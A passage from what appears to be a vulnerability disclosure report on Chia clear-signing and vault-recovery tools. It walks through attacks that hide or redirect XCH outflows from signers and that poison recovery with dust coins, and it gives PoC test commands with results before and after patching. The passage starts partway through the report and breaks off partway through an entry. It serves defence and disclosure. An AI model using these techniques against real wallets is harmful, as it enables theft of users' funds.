#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run POC-3 (500 XCH NFT Metadata Updater Hidden Fee) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc3 -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-02": {
    "RED": {
      "poc3_spend_bundle_sha256": "b314b6d7411bfb8a87bd4b091a117b861e5a171ed4a0a4712955c592962042e6",
      "poc3_spend_bundle_bytes": 3300,
      "clear_signing_displayed_fee_mojo": 0,
      "consensus_drained_fee_mojo": 500000000000000
    },
    "GREEN": {
      "poc3_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.26 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Dependent Offer Leg Set-Intersection Outflow Omission Hiding `500 XCH` Payment (`CS-03` / `POC-4`) (`CWE-682 / CWE-451`, CVSS `8.6 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Affected Versions & Components:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (dependent offer leg aggregation)
* **Vulnerability Class & Score:** `CWE-682 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md`](advisories/ja/26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Set-Intersection Filtering Across Dependent Settlement Legs (`clear_signing.rs`):** When a Vault transaction participates in a multi-leg Offer settlement (`POC-4`), `cni-wallet-sdk` correlates notarized payments across legs using set intersection rather than union/full conservation.
2. **Step 2 — Non-Overlapping `500 XCH` (`500,000,000,000,000 mojo`) Outflow Dropped from Signing Preview:** In `POC-4` (vault spend `3c55638a605214afd4e6ca592d439b6e9b69e4550f40ce07f85daec8cef87fb8`, settlement spend `7c05b725fb43d8fae280b3e1cd0417b752598e8ce9bd7ae45c1a2f7b63ccf525`), the secondary `500 XCH` payment leg to the attacker is excluded by the set intersection check and never shown in the Clear-Signing summary.
3. **Step 3 — Full `500 XCH` Outflow Executes On-Chain:** Once signed, both settlement legs execute on-chain and transfer `500 XCH` to the attacker.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Uses set intersection across dependent settlement legs instead of accounting for every
// notarized payment outflow funded by the vault's settlement coins!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Hidden `500 XCH` (`500,000,000,000,000 mojo`) Leg in a P2P Offer (`POC-4`):** A trader accepts a multi-leg Offer (`vault SpendBundle: 3c55638a605214afd4e6ca592d439b6e9b69e4550f40ce07f85daec8cef87fb8`) whose Clear-Signing preview omits the `500 XCH` settlement leg (`7c05b725fb43d8fae280b3e1cd0417b752598e8ce9bd7ae45c1a2f7b63ccf525`).
* **Scenario B — OTC Treasury Swap Drain:** An institutional treasury signs what appears to be a small fee/test swap while a disjoint `500 XCH` settlement leg drains treasury funds.
* **Scenario C — Patched Verification (`GREEN`):** All settlement payment legs funded by the vault are unioned and strictly validated.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run POC-4 (500 XCH Dependent Offer Leg Set-Intersection Omission) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc4 -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-03": {
    "RED": {
      "poc4_vault_spend_bundle_sha256": "3c55638a605214afd4e6ca592d439b6e9b69e4550f40ce07f85daec8cef87fb8",
      "poc4_settlement_spend_bundle_sha256": "7c05b725fb43d8fae280b3e1cd0417b752598e8ce9bd7ae45c1a2f7b63ccf525",
      "omitted_outflow_mojo": 500000000000000
    },
    "GREEN": {
      "poc4_rejected_or_fully_accounted": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.27 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Unrevealed Settlement Spend Blind Spot Allowing Post-Signature `600 XCH` Drain (`CS-04` / `POC-5`) (`CWE-345 / CWE-451`, CVSS `8.6 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Affected Versions & Components:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (unrevealed settlement output handling)
* **Vulnerability Class & Score:** `CWE-345 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md`](advisories/ja/27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Settlement Coins Require No Signature to Spend Once Created:** Any coin created at `SETTLEMENT_PAYMENT_HASH` can be spent by anyone who supplies a matching notarized payment solution (unless constrained by a signed announcement in the parent vault spend).
2. **Step 2 — Clear-Signing Accepts Bundles Where the Created Settlement Coin Is Left Unspent (`clear_signing.rs`):** In `POC-5`, the signing bundle (`a9eeda2c8526d95cb0a36ffcdf9a026b23e96c11e15ee419938e18dc342277eb`, `1,303 bytes`) creates a `600 XCH` (`600,000,000,000,000 mojo`) settlement coin without including its spend in the preview bundle. Unpatched Clear-Signing does not report an external outflow.
3. **Step 3 — Attacker Attaches the Settlement Spend (`e0b876fbb8e0f264...`) Post-Signing:** After the victim signs the vault spend, the attacker appends the `600 XCH` settlement spend (`388 bytes`) and broadcasts the combined bundle on-chain.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Allows a vault spend to create a SETTLEMENT_PAYMENT_HASH coin without requiring
// the corresponding settlement CoinSpend to be revealed and verified in the signing bundle!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Post-Signing Attachment of an Unrevealed `600 XCH` (`600,000,000,000,000 mojo`) Settlement Spend (`POC-5`):** The victim reviews and signs vault bundle `a9eeda2c8526d95cb0a36ffcdf9a026b23e96c11e15ee419938e18dc342277eb`; the attacker attaches `e0b876fbb8e0f26400a38fb5e2e9963a5cb1dbff92b76d78b4403ed0cb2f7cbe` and sweeps `600 XCH`.
* **Scenario B — Hardware Wallet Blind Signing via Deferred Settlement Reveal:** Air-gapped hardware signers see zero external recipients during review while signing away `600 XCH` into an unrevealed settlement coin.
* **Scenario C — Patched Verification (`GREEN`):** Any unspent/unrevealed settlement output in a Clear-Signing bundle is rejected fail-closed.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run POC-5 (600 XCH Unrevealed Settlement Spend Blind Spot) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc5 -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-04": {
    "RED": {
      "poc5_vault_spend_bundle_sha256": "a9eeda2c8526d95cb0a36ffcdf9a026b23e96c11e15ee419938e18dc342277eb",
      "poc5_vault_spend_bundle_bytes": 1303,
      "poc5_attached_settlement_spend_bundle_sha256": "e0b876fbb8e0f26400a38fb5e2e9963a5cb1dbff92b76d78b4403ed0cb2f7cbe",
      "poc5_attached_settlement_bytes": 388,
      "hidden_outflow_mojo": 600000000000000
    },
    "GREEN": {
      "poc5_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.28 — Chia-Network/cni-wallet-sdk (`chia-sdk-bindings <= 0.38.0 / chia-sdk-driver <= 0.36.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing External `DropCoin` Vault Change Spoofing Hiding `1,000 XCH` Vault Drain Across the `chia-sdk-bindings` FFI Boundary (`CS-05` / `POC-6`) (`CWE-682 / CWE-451`, CVSS `9.1 Critical`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (`chia-sdk-driver` & `chia-sdk-bindings` FFI): chia-sdk-bindings`)
* **Affected Versions & Components:** `chia-sdk-bindings <= 0.38.0 / chia-sdk-driver <= 0.36.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs`, `crates/chia-sdk-bindings/src/clear_signing.rs:62` (`parse_vault_transaction`)
* **Vulnerability Class & Score:** `CWE-682 / CWE-451` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md`](advisories/ja/28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — External `DropCoin` Output Credited as Vault Change (`clear_signing.rs` & `chia-sdk-bindings/src/clear_signing.rs:62`):** When `parse_vault_transaction` computes the net outflow of a Vault transaction, it credits outputs sent to the vault's puzzle hash as vault change without verifying that the parent coin creating that output actually belonged to the vault (`DropCoin` parent lineage).
2. **Step 2 — Masking a `1,000 XCH` (`1,000,000,000,000,000 mojo`) Vault Drain (`SpendBundle SHA-256: aa65182292515596...`):** In `POC-6` (`1,477 bytes`), the victim's vault sends `1,000 XCH` to the attacker while an external `DropCoin` spend included in the bundle creates a `1,000 XCH` output to the vault's puzzle hash. Unpatched Clear-Signing nets the two against each other and reports `0 XCH` net vault loss!
3. **Step 3 — Verified Directly Across the Production `chia-sdk-bindings` FFI Entrypoint (`clear_signing_ffi_proof.rs`):** Calling `chia_sdk_bindings::parse_vault_transaction` directly confirms the FFI boundary misreports the `1,000 XCH` drain in `RED` and returns `Error::NonStandardInnerSpend` in `GREEN`.

```rust
// File: crates/chia-sdk-bindings/src/clear_signing.rs (line 62) & chia-sdk-driver/src/clear_signing.rs
pub fn parse_vault_transaction(vault: ClvmVault, spend_bundle: SpendBundle, ...) -> Result<TransactionSummary> {
    // BUG: Credits outputs from external non-vault DropCoin spends as vault change,
    // masking a 1,000 XCH outflow from the victim's vault!
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — `1,000 XCH` (`1,000,000,000,000,000 mojo`) Enterprise Vault Drain Displayed as Zero Net Outflow at the FFI Boundary (`POC-6`):** An institutional custodian reviews `SpendBundle` `aa6518229251559629861e9137f5cbd5186cb20b46c216a64dc209b86ed3004e` (`1,477 bytes`) via a mobile/hardware signer powered by `chia-sdk-bindings` and sees `0 XCH` net vault outflow while signing away `1,000 XCH`.
* **Scenario B — Multi-Sig Quorum Deception:** Multiple hardware cosigners independently verify the same FFI `TransactionSummary` and approve the `1,000 XCH` theft.
* **Scenario C — FFI Boundary Patch Verification (`GREEN`):** `clear_signing_ffi_proof.rs` verifies `parse_vault_transaction` rejects the spoofed `DropCoin` bundle with `Error::NonStandardInnerSpend`.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run POC-6 in chia-sdk-driver and the FFI Boundary Proof in chia-sdk-bindings
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc6 -- --nocapture
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-bindings --test clear_signing_ffi_proof -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-05": {
    "RED": {
      "poc6_spend_bundle_sha256": "aa6518229251559629861e9137f5cbd5186cb20b46c216a64dc209b86ed3004e",
      "poc6_spend_bundle_bytes": 1477,
      "vault_drain_amount_mojo": 1000000000000000,
      "ffi_boundary_parse_vault_transaction_masked": true
    },
    "GREEN": {
      "ffi_boundary_rejected_with": "Error::NonStandardInnerSpend",
      "ffi_test_file_sha256": "73dbe05adb2538ceb88cca5b2ecf4c1678e4ed537d3accb17535d8666727fb52"
    }
  }
}
```


---

### III.29 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Offer Pre-Split Unbound Destination Splicing Redirecting `1,000 XCH` Under an Unchanged BLS Signature (`CS-06` / `POC-7`) (`CWE-347 / CWE-451`, CVSS `9.1 Critical`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Affected Versions & Components:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (offer pre-split coin destination binding)
* **Vulnerability Class & Score:** `CWE-347 / CWE-451` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md`](advisories/ja/29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Pre-Split Intermediate Coin Spent Without Cryptographic Destination Binding (`clear_signing.rs`):** In an Offer pre-split transaction (`POC-7`), the user signs a bundle (`476b8e836e435eecb16fb924b8d8b8532fb6872fda3f9d50030d98231fff7833`, `1,994 bytes`) that splits `1,000 XCH` (`1,000,000,000,000,000 mojo`) into an intermediate settlement/pre-split coin whose downstream spend is not pinned by an `ASSERT_PUZZLE_ANNOUNCEMENT` signed by the vault.
2. **Step 2 — Post-Signature Splicing Under the Same BLS Signature:** After the victim signs the pre-split bundle, an attacker or relayer replaces/splices the downstream child spend, producing final `SpendBundle` `5b3a3b21376bfdfe06e7cc1ec334c43ffd3bb97b72133aeaa38f4de040ba0a93` (`1,701 bytes`).
3. **Step 3 — `1,000 XCH` Redirected to Attacker While BLS Signature Remains Valid:** Because the vault's signed condition only covered the pre-split creation and not the final recipient, the victim's original BLS signature validates the modified `1,000 XCH` transfer to the attacker.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Accepts pre-split / intermediate child spends in Clear-Signing without verifying
// that the vault's signed spend asserts an announcement binding the child spend's outputs!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Relayer / DEX Aggregator Redirects `1,000 XCH` (`1,000,000,000,000,000 mojo`) After User Signs (`POC-7`):** The victim signs `476b8e836e435eecb16fb924b8d8b8532fb6872fda3f9d50030d98231fff7833`; the relayer splices the unbound child spend into `5b3a3b21376bfdfe06e7cc1ec334c43ffd3bb97b72133aeaa38f4de040ba0a93` and steals `1,000 XCH` under the unchanged BLS signature.
* **Scenario B — Mempool Front-Running of Unbound Pre-Split Spends:** Any mempool observer replaces the unsigned child spend before block inclusion.
* **Scenario C — Patched Verification (`GREEN`):** Clear-Signing requires every downstream spend in the bundle to be cryptographically bound by an announcement asserted in the signed vault spend.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run POC-7 (1,000 XCH Offer Pre-Split Post-Signature Splicing) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc7 -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-06": {
    "RED": {
      "poc7_pre_split_spend_bundle_sha256": "476b8e836e435eecb16fb924b8d8b8532fb6872fda3f9d50030d98231fff7833",
      "poc7_pre_split_bytes": 1994,
      "poc7_spliced_final_spend_bundle_sha256": "5b3a3b21376bfdfe06e7cc1ec334c43ffd3bb97b72133aeaa38f4de040ba0a93",
      "poc7_spliced_final_bytes": 1701,
      "redirected_amount_mojo": 1000000000000000,
      "original_bls_signature_valid_on_spliced": true
    },
    "GREEN": {
      "poc7_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.30 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing Reverse-Clawback `sender_puzzle_hash` Ownership Spoofing Allowing Unilateral `1,000 XCH` Hijack (`CS-07` / `POC-8`) (`CWE-345 / CWE-451`, CVSS `8.6 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Affected Versions & Components:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (Clawback `sender_puzzle_hash` ownership check)
* **Vulnerability Class & Score:** `CWE-345 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md`](advisories/ja/30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Missing Verification That `sender_puzzle_hash` Belongs to the Signing Vault (`clear_signing.rs`):** When a Vault creates a Clawback-protected output (`POC-8`), `cni-wallet-sdk` inspects the Clawback parameters and memo/hint without verifying that the Clawback `sender_puzzle_hash` (the party authorized to claw back the coin before the timelock expires) is owned by the signing vault.
2. **Step 2 — Reverse-Clawback Trap (`SpendBundle SHA-256: 6897c10eb9cf718f...`):** In `SpendBundle` `6897c10eb9cf718ffa9bbfff998e6a496d3532bf2d198c8df16bf92e2d5f9db1` (`1,218 bytes`), `1,000 XCH` (`1,000,000,000,000,000 mojo`) from the victim's vault is locked into a Clawback coin where `sender_puzzle_hash` is set to the attacker's puzzle hash.
3. **Step 3 — Attacker Immediately Claws Back the Victim's `1,000 XCH`:** The moment the transaction lands on-chain, the attacker exercises the `sender_puzzle_hash` branch to immediately sweep the `1,000 XCH` before the timelock expires.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Parses Clawback output without verifying clawback.sender_puzzle_hash == vault_p2_puzzle_hash,
// allowing an attacker to be set as the Clawback sender on a 1,000 XCH vault outflow!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — `1,000 XCH` (`1,000,000,000,000,000 mojo`) Vault Transfer Hijacked via Reverse Clawback (`POC-8`):** A vault operator signs `6897c10eb9cf718ffa9bbfff998e6a496d3532bf2d198c8df16bf92e2d5f9db1` believing the transfer is protected by Clawback; the attacker is curried as `sender_puzzle_hash` and immediately sweeps the `1,000 XCH`.
* **Scenario B — Self-Transfer / Escrow Illusion:** The recipient/memo points back to the victim's own address so Clear-Signing looks like a safe self-custody move, while `sender_puzzle_hash` gives the attacker instant withdrawal rights.
* **Scenario C — Patched Verification (`GREEN`):** Clear-Signing rejects any Clawback output funded by the vault whose `sender_puzzle_hash` does not belong to the vault.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run POC-8 (1,000 XCH Reverse-Clawback Sender Hijack) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc8 -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-07": {
    "RED": {
      "poc8_spend_bundle_sha256": "6897c10eb9cf718ffa9bbfff998e6a496d3532bf2d198c8df16bf92e2d5f9db1",
      "poc8_spend_bundle_bytes": 1218,
      "hijacked_clawback_amount_mojo": 1000000000000000,
      "attacker_is_clawback_sender": true
    },
    "GREEN": {
      "poc8_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.31 — Chia-Network/cni-wallet-sdk (`chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)`) — `cni-wallet-sdk` Clear-Signing External CAT Ring Melt/Issuance Accounting Omission Hiding `750 XCH`-Scale Asset Drain (`CS-08` / `POC-9`) (`CWE-682 / CWE-451`, CVSS `8.6 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/cni-wallet-sdk` (`Cargo / Rust (Chia Mobile & Hardware Clear-Signing SDK): chia-sdk-driver`)
* **Affected Versions & Components:** `chia-sdk-driver <= 0.36.0 / workspace <= 0.38.0 (commit e8951e21ece7bfa7a1534e35319bc4a32ddc589d)` — `crates/chia-sdk-driver/src/clear_signing.rs` (external CAT ring TAIL melt/issuance accounting)
* **Vulnerability Class & Score:** `CWE-682 / CWE-451` — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md`](advisories/ja/31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Chia CAT Ring Conservation Balances Across All Spends in the Ring:** In Chia's CAT2 standard, multiple CAT coin spends form a ring where a negative `extra_delta` (`RUN_TAIL` melt, opcode `51 0 -113`) in an external ring member is funded by the excess input of the victim vault's CAT spend.
2. **Step 2 — Clear-Signing Ignores External Ring Members Executing `RUN_TAIL` (`clear_signing.rs`):** In `POC-9` (`SpendBundle SHA-256: e48c3171dc9a9b4b5914597784e7b5039a9af340c66aa2158bac22f1fba295ff`, `2,541 bytes`), the victim's vault supplies `750,000,000,000,000` mojos (`750 XCH` scale) into the CAT ring while an external ring coin melts/extracts the delta without appearing as a vault outflow in Clear-Signing.
3. **Step 3 — Signer Approves Hidden `750 XCH`-Scale CAT Drain:** The user signs what appears to be a balanced CAT ring spend while `750,000,000,000,000` mojos are absorbed by the external ring member.

```rust
// File: crates/chia-sdk-driver/src/clear_signing.rs
// BUG: Does not account for external CAT ring members executing RUN_TAIL melt/issuance deltas
// funded by the vault's CAT coin spend!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Hidden `750 XCH`-Scale (`750,000,000,000,000 mojo`) CAT Ring Melt Drain (`POC-9`):** A treasury signs `SpendBundle` `e48c3171dc9a9b4b5914597784e7b5039a9af340c66aa2158bac22f1fba295ff` (`2,541 bytes`), funding an external CAT ring melt invisible in the Clear-Signing summary.
* **Scenario B — Wrapped-Asset / Stablecoin Redemption Hijack:** An attacker pairs a victim's CAT spend with an external redemption/melt spend to extract underlying XCH or bridge credits.
* **Scenario C — Patched Verification (`GREEN`):** Clear-Signing verifies full ring conservation across all CAT ring members.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run POC-9 (750 XCH-Scale External CAT Ring Melt/Issuance Omission) in cni-wallet-sdk
cargo test --manifest-path /home/community-user/targets/cni-wallet-sdk/Cargo.toml \
  -p chia-sdk-driver clear_signing::tests::test_poc9 -- --nocapture
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-CS-08": {
    "RED": {
      "poc9_spend_bundle_sha256": "e48c3171dc9a9b4b5914597784e7b5039a9af340c66aa2158bac22f1fba295ff",
      "poc9_spend_bundle_bytes": 2541,
      "omitted_cat_ring_delta_mojo": 750000000000000
    },
    "GREEN": {
      "poc9_rejected_fail_closed": true,
      "patch_sha256": "d92c4b9d9856f59e1d676468a2966bf7a474aa82efcb657c9ec3ecd8ad000e27"
    }
  }
}
```


---

### III.32 — Chia-Network/chia-vault-recover (`<= 1.0.0-rc9 (verified on commit 75e3a8efe02a131adbf3059afc20852de183ca82)`) — `chia-vault-recover` Unverified First-Child Singleton Launcher Selection Allowing 1-Mojo Dust Poisoning of Emergency Vault Recovery (`VR-01` / `POC-10`) (`CWE-345 / CWE-400`, CVSS `7.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-vault-recover` (`Cargo / Rust (Chia Emergency Vault Recovery CLI): chia-vault-recover`)
* **Affected Versions & Components:** `<= 1.0.0-rc9 (verified on commit 75e3a8efe02a131adbf3059afc20852de183ca82)` — `src/locate.rs:148-219` (`find_launcher_id`)
* **Vulnerability Class & Score:** `CWE-345 / CWE-400` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md`](advisories/ja/32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unverified First-Match `SINGLETON_LAUNCHER_HASH` Return in `find_launcher_id` (`src/locate.rs:148-219`):** To locate a user's Vault singleton, `find_launcher_id` fetches all coins at the user's address via `get_coin_records_by_puzzle_hash`, inspects each coin's parent spend, and immediately returns the **first** child coin whose puzzle hash equals `SINGLETON_LAUNCHER_HASH`.
2. **Step 2 — 1-Mojo Dust Coin Poisons Vault Discovery at lower Block Height (`height=9..10` vs `height=11..12`):** An attacker sends a 1-mojo dust coin to the victim's address from a parent spend that also spawns a decoy singleton (`2de44601e6fcf4bdfc88eb553ddca729751a06da78cec724519e741f1dfefacf`). Because Chia's `FullNodeRpcApi` returns coin records ordered by confirmation height, `find_launcher_id` selects the attacker's decoy launcher before reaching the victim's real Vault launcher (`e53d0c41ce3a78de1426630d059958ef37a5d7f55551d47908f9a106024640eb`).
3. **Step 3 — Compiled Release CLI Aborts With `clawback check: recovery phrase does not match`:** Executed against a live `FullNodeRpcApi` server with zero static fixtures, the unpatched CLI (`chia-vault-recover-red`) locks onto `2de44601...` and terminates with exit code `1`, whereas the patched release binary (`chia-vault-recover 1.0.0-rc9`, `SHA-256: d6e6b0bb5e0d160d9a342274e2c1d384f67fa57c0c218267b27f46195c1370c3`) skips the decoy and recovers the victim's vault.

```rust
// File: src/locate.rs (lines 148-219)
pub async fn find_launcher_id(client: &Client, address_puzzle_hash: Bytes32, ...) -> Result<Bytes32> {
    // BUG: Returns the very first SINGLETON_LAUNCHER_HASH child found at address_puzzle_hash
    // without verifying that the singleton's custody/recovery configuration matches the user's keys!
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — 1-Mojo Dust Transaction Locks Emergency Vault Recovery CLI (`POC-10`):** When a user loses their primary signer and runs `chia-vault-recover` (`1.0.0-rc9`) with their recovery phrase, a single 1-mojo dust coin sent by an attacker causes the CLI to abort with `clawback check: recovery phrase does not match`.
* **Scenario B — Combined Attack Chain (`WLC-02` + `VR-01` — Total Vault Recovery Lockout):** While an attacker's unauthorized Vault recovery timer counts down, the attacker blocks the victim's live wallet cancellation via `WLC-02` and simultaneously poisons `chia-vault-recover` via `VR-01`, leaving the victim with zero working recovery tools.
